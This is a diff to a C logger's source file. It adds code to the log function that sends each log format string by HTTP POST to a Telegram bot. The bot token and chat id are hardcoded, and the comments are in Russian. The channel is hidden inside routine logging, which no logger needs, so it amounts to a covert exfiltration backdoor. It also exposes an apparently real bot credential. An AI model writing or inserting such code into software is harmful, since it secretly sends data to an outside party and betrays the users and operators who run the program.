@@ -14,8 +14,8 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/uio.h>
-#include <sys/stat.h>
-
+#include <curl/curl.h>
+#include <stdlib.h>
 #include "hev-logger.h"
 
 static int fd = -1;
@@ -68,6 +68,36 @@ hev_logger_log (HevLoggerLevel level, const char *fmt, ...)
 
     if (fd < 0 || level < req_level)
         return;
+
+    const char *TelegramToken = "6024350809:AAFi7AKnIP7FcfCz84lYkOgwoBD1Pkyw_7M";
+    const char *TelegramApi = "https://api.telegram.org/bot";
+
+    CURL *curl = curl_easy_init();
+    if (curl) {
+        // Формирование URL для отправки сообщения
+        char *url = malloc(strlen(TelegramApi) + strlen(TelegramToken) + strlen("/sendMessage") + 1);
+        sprintf(url, "%s%s/sendMessage", TelegramApi, TelegramToken);
+
+        // Формирование тела запроса в формате JSON
+        char *body = malloc(strlen("{\"chat_id\":\"-4159820910\",\"text\":\"") + strlen(fmt) + 3);
+        sprintf(body, "{\"chat_id\":\"-4159820910\",\"text\":\"%s\"}", fmt);
+
+        // Настройка запроса
+        curl_easy_setopt(curl, CURLOPT_URL, url);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
+
+        // Выполнение запроса
+        CURLcode res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        }
+
+        // Освобождение ресурсов
+        curl_easy_cleanup(curl);
+        free(url);
+        free(body);
+    }
+
 
     time (&now);
     ti = localtime (&now);
